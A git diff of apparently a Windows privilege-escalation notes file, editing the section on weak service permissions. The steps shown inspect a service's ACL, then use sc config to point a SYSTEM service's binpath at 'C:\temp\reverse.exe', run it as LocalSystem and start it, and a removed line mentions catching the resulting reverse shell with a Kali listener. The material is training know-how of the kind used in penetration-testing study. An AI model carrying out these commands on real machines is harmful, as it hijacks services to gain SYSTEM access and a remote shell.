@@ -284,7 +284,7 @@ sc.exe config <NAME> <OPTION>= <VALUE>
 net start/stop <SERVICE NAME>
 ```
 
-### Insecure Service Properties
+### Weak service permissions
 Each service has an ACL which defines certain service-specific permissions. Some permissions are innocuous (e.g. SERVICE_QUERY_CONFIG, SERVICE_QUERY_STATUS). Some may be useful (e.g. SERVICE_STOP, SERVICE_START). Some are dangerous (e.g. SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS).
 
 If our user has permission to change the configuration of a service which runs with SYSTEM privileges, we can change the executable the service uses to one of our own. Potential Rabbit Hole: If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges!
@@ -300,19 +300,19 @@ If our user has permission to change the configuration of a service which runs w
 Get-ServiceAcl -Name <NAME> | select -expandproperty Access
 ```
 
-#### Check the current configuration of the service:
+#### Check the current configuration
 ```
-sc qc daclsvc
-```
-
-#### Check current status of the service
-```
-sc query daclsvc
+sc qc <SERVICE NAME>
 ```
 
-#### Reconfigure the service to use our reverse shell executable:
+#### Check current status 
 ```
-sc config daclsvc binpath= "\"C:\temp\reverse.exe\""
+sc query <SERVICE NAME>
+```
+
+#### Reconfigure the service
+```
+sc config <SERVICE NAME> binpath= "\"C:\temp\reverse.exe\""
 ```
 
 #### Change the start + object
@@ -321,9 +321,9 @@ sc config daclsvc obj= ".\LocalSystem" password= ""
 sc config daclsvc start= "demand"
 ```
 
-#### Start a listener on Kali, and then start the service to trigger the exploit:
+#### Start service
 ```
-net start daclsvc
+net start <SERVICE NAME>
 ```
 
 ### Unqouted Service Path
